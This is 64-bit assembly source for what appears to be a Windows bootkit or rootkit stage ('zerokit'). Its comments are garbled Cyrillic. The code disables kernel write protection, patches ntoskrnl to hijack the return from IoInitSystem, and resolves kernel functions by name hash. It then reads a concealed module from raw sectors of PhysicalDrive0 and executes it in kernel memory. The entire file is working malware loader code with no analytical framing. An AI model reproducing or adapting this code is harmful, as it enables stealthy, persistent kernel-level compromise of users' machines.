use64

sub    rsp, 0x78 ; �������� ����� � ����� ��� RCX-home (16 ����) � ����� ��� ������� �������� � IoInitSystem � � ��� ���.

push   rsi
; ���������� ��� ��������� ������ (16 ���).
mov    rax, cr0
push   rax ; +8 � ����
and    eax, 0xFFFEFFFF
mov    cr0, rax

call   Get_Current_EIP_0
Get_Current_EIP_0:
pop    rsi
add    rsi, orig_addr_value - Get_Current_EIP_0 ; esi = ���������� ����� temp_data_x32.

mov    rax, [rsi] ; eax = ���������� ����� IoInitSystem.
mov    [rsp + 16], rax ; ����� ����� �������� � IoInitSystem.

; ��������������� �������������� �����, ������� �� �������� �� ����.
mov    rdx, [rsp + 136] ; edi = ����� �������� �� ������ ���� � ntoskrnl.
sub    rax, rdx ; ��������� ��������� ������������� ������ �������� �� IoInitSystem.
mov    [rdx - 4], eax

; ������������� ����� �������� �� IoInitSystem � ���� ���-�������, ��� ����� ����������� ������ ��������.
lea    rax, [rsi + execute_payload_x64 - orig_addr_value] ; eax = ���������� ����� execute_payload_x64
mov    [rsp + 24], rax




; ��������������� WP-���.
pop    rax
mov    cr0, rax

pop    rsi

ret ; ������� ���������� �� IoInitSystem.


; ����� �� �������� ���������� ����� ���������� ������ ������� IoInitSystem.
execute_payload_x64:
push   rax
push   rbx
push   rsi
push   rdi
push   rbp
pushfq
cld

sub    rsp, 50 ; �������� ����� � ����� ��� IDT � ������� ����������� �������.

; store IDTR on stack
sidt   [rsp] ; ��������� IDT ������� � ���� (6 ����)
pop    bx ; 16 bit IDT limit
pop    rbx ; 64 bit IDT address
mov    rbp, rsp
add    rbp, 8 ; (ebp - 40) = ����� ��� hFile, ������� ����������������� ������� ZwCreateFile.

;typedef struct _IDT_ENTRY
;{
;	uint16_t offset00_15;
;	uint16_t selector;
;	uint8_t ist:3;		// Interrupt Stack Table
;	uint8_t zeroes:5;
;	uint8_t gateType:4;
;	uint8_t zero:1;
;	uint8_t dpl:2;
;	uint8_t p:1;
;	uint16_t offset16_31;
;	uint32_t offset32_63;
;	uint32_t unused;
;} IDT_ENTRY, *PIDT_ENTRY;
mov    rax, [rbx + 4] ; Offset 16..63  [Interrupt Gate Descriptor]
mov    ax, [rbx] ; Offset 0..15   [Interrupt Gate Descriptor]
and    ax, 0xF000 ; ����������� ����� �� ������� ��������.
mov    rbx, rax
sub    rax, rax

; ������� � ����������� ���������� ������� ������ ���� ���� ���� (ntoskrnl.exe).
find_pe_image_base_loop:
sub    rbx, 4096 ; ���������� �� �������� ����.
cmp    word [rbx], 'MZ' ; ��������� �� ������� ��������� MZ.
jnz    find_pe_image_base_loop
mov    eax, [rbx + 0x3c] ; �������� �������� ������������ ������ ������ �� PE ���������.
cmp    dword [rbx + rax], 'PE' ; ��������� ������� ��������� PE ���������.
jnz    find_pe_image_base_loop
cmp    word [rbx + rax + 0x18], 0x020B ; ��������� Magic
jnz    find_pe_image_base_loop

call   data_addr_call

; ���-����� �������, ������� ��� ����� ��� ������� �������� (� ���������� ������� - ��������� ���������).
ExAllocatePoolWithTag dd 0x756CEEDA ; rbp-32
ZwClose               dd 0x9292AAB1 ; rbp-24
ZwCreateFile          dd 0xB8D72BA8 ; rbp-16
ZwReadFile            dd 0x9652DDAC ; rbp-8
                      dd 000000000h ; hash zero terminator (no more hash following)

data_addr_call:
lea    rdx, [rbx + rax] ; edx = ����� PE ���������.
;mov    ecx, [rdx + 0x50] ; ecx = ������ ������ (SizeOfImage).
;mov    rdi, rbx ; edi = ���� ������.

; ��������� ������� ��������, ������� ������ ������ ������� �� �� �����.
mov    eax, [rdx + 0x88] ; [edx + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress].
lea    rdx, [rax + rbx] ; rdx = ���������� ����� �� ������ ��������.
xor    rcx, rcx
xor    eax, eax

;typedef struct _IMAGE_EXPORT_DIRECTORY {
;	uint32_t   Characteristics;
;	uint32_t   TimeDateStamp;
;	uint16_t    MajorVersion;
;	uint16_t    MinorVersion;
;	uint32_t   Name;
;	uint32_t   Base;
;	uint32_t   NumberOfFunctions;
;	uint32_t   NumberOfNames;
;	uint32_t   AddressOfFunctions;     // RVA from base of image
;	uint32_t   AddressOfNames;         // RVA from base of image
;	uint32_t   AddressOfNameOrdinals;  // RVA from base of image
;} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
next_export_loop:
;  ecx      export counter
;  ebx      still base of ntoskrnl image (points to DOS Header)
;  esi      Export Name
;  edi      Hash Value
;  [esp]    Pointer to Next Hash
;  ebp      Pointer to Stack Variables
inc    ecx
xor    rsi, rsi
mov    esi, [rdx + 0x20] ; [rdx + AddressOfNames].
add    rsi, rbx ; ���������� ����� �� AddressOfNames.
mov    eax, [rsi + 4 * rcx]
lea    rsi, [rbx + rax] ; rsi = �����, ��� ����� ��� ��������� �������������� �������.

sub    rax, rax
xor    edi, edi

; ��������� ���-�������� ��� ����� �������.
calc_name_hash_loop:
lodsb
or     al, al
jz     Hash_Generated
ror    edi, 11
add    edi, eax
jmp    calc_name_hash_loop

Hash_Generated:
mov    rsi, [rsp] ; rsi = ���������� ����� ������� � ������ �������.
lodsd ; ��������� ��������� ���-��������.
or     eax, eax ; �����?
jz     all_hashes_resolved ; ��������� ����� ������� �������.
cmp    edi, eax ; ��������� ����?
jnz    next_export_loop ; ���� �� ���������, ��������� � ��������� �������.
mov    [rsp], rsi ; ��������� ��������� �� ������� �����.
mov    eax, [rdx + 0x24] ; [edx + AddressOfNameOrdinals].
lea    rdi, [rbx + rax] ; ���������� �����.
movzx  eax, word [rdi + 2 * rcx] ; index ������ ������� ���������.
push   rax
mov    eax, [rdx + 0x1C] ; [edx + AddressOfFunctions].
lea    rdi, [rbx + rax] ; ���������� �����.
pop    rax
mov    eax, [rdi + 4 * rax] ; lookup the address
add    rax, rbx ; eax = ����� �������������� �������.
xchg   rdi, rbp ; edi = �����, ���� ����� ������� ����� �������.
stosq ; ��������� �����.
xchg   rdi, rbp ; ebp = �����, ��� ����� ������� ����� ��������� �������������� �������.
jmp    next_export_loop

all_hashes_resolved:
mov    rsi, [rsp] ; esi = ���������� ����� data_addr_call - 4.
add    rsi, payload_data - data_addr_call + 4
mov    [rsp], rsi

; set up data buffers (IoStatusBlock, FileHandle)
xor    rax, rax
push   rax ; IoStatusBlock
push   rax ; IoStatusBlock
mov    r9, rsp ; r9 points to 2 dwords data buffer (zeroed out)

mov    rbx, rsi ; ebx = ��������� �� �������������� ������ � ��������.

; set up correct ObjectName (UNICODE_STRING structure)
add    rsi, disk_name_data - payload_data ; esi = ���������� ����� � ����� �����.
push   rsi ; &length
add    qword [rsp], 4 ; +4 = address of unicode string
push   qword [rsi]
mov    rsi, rsp

; �������������� ��������� OBJECT_ATTRIBUTES � �����.
;typedef struct _OBJECT_ATTRIBUTES {
;    ULONG Length;
;    HANDLE RootDirectory;
;    PUNICODE_STRING ObjectName;
;    ULONG Attributes;
;    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
;    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
;} OBJECT_ATTRIBUTES;
push   rax ; SecurityQualityOfService  = NULL
push   rax ; SecurityDescriptor        = NULL
push   0x00000240 ; Attributes    = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
push   rsi ; ObjectName                = "\??\PhysicalDrive0"
push   rax ; RootDirectory             = NULL
push   48 ; Length               = sizeof(OBJECT_ATTRIBUTES)
mov    r8, rsp

sub    rsp, 8 * 12; ������� ����� � ����� ��� ���������� ������� � ������ ������.

; ZwCreateFile(&FileHandle, GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL)
; �������� ������
mov    rdi, rsp
mov    rcx, 2 * 12
rep    stosd
mov    [rsp + 64], byte 0x00000020
mov    [rsp + 56], byte 0x00000001
mov    [rsp + 48], byte 0x00000003

mov    edx, 0x80100000
lea    rcx, [rbp - 40]
call   qword [rbp - 16]
or     eax, eax ; eax == STATUS_SUCCESS?
jnz    execute_payload_x64_exit

; �������� �������:
; PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
; ExAllocatePoolWithTag(NonPagedPool, zerokitSize, 0x74696E49);
xor    rdx, rdx
xor    rcx, rcx ; NonPagedPool
mov    r8d, 0x74696E49 ; Tag
mov    edx, [rbx + 8] ; zerokitSize
call   qword [rbp - 32]
or     rax, rax ; ���������� ��������?
jz     execute_payload_x64_exit_close_and_exit
mov    rsi, rax ; rsi = �����, ���� ����� �������� �������.

; �������� �������:
; NTSTATUS ZwReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
; ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, zerokitSize, offset, 0);
xor    eax, eax
mov    rdi, rsp
mov    rcx, 2 * 9
rep    stosd
mov    [rsp + 40], rsi ; Buffer
mov    [rsp + 56], rbx ; ByteOffset
mov    eax, dword [rbx + 8] 
mov    [rsp + 48], eax ; Length = zerokitSize.
mov    [rsp + 32], r9
xor    r9, r9
xor    r8, r8
xor    rdx, rdx
mov    rcx, [rbp - 40]
call   qword [rbp - 8]
or     eax, eax
jnz    execute_payload_x64_exit_close_and_exit

; ������� ���������� ��������.
;typedef struct _mod_header
;{
;	uint32_t fakeBase;      // �������� ���� ��� ���������� �������� ��������.
;	uint64_t crc;           // 64-������ ����������� ����� ����������� �� ���� mod-�.
;	uint32_t sizeOfMod;     // ������ ����, ������� ���������� ����� ����� ������� ���������.
;	uint32_t entryPointRVA; // RVA ����� ����� ������������ ���������.
;	uint32_t reserved1;     // 
;	uint32_t reserved2;
;	uint32_t reserved3;
;} mod_header_t, *pmod_header_t;
mov    r8d, [rsi + 16]
lea    rax, [rsi + r8]
mov    rcx, rsi
call   rax ; �������� ����� ����� mod_common.

execute_payload_x64_exit_close_and_exit:
; �������� �������:
; NTSTATUS ZwClose(HANDLE Handle);
; ZwClose(FileHandle);
mov    rcx, [rbp - 40]
call   qword [rbp - 24]

execute_payload_x64_exit:
mov    rsp, rbp
popfq
pop    rbp
pop    rdi
pop    rsi
pop    rbx
pop    rax
add    rsp, 0x68 ; ��������� �� ����� ��������, ������� �� ����������� ��� IoInitSystem.
ret


payload_data:
LoaderOffsetLo dd 0
LoaderOffsetHi dd 0
LoaderSize dd 0 

orig_addr_value:
nop
nop
nop
nop
nop
nop
nop
nop

disk_name_data: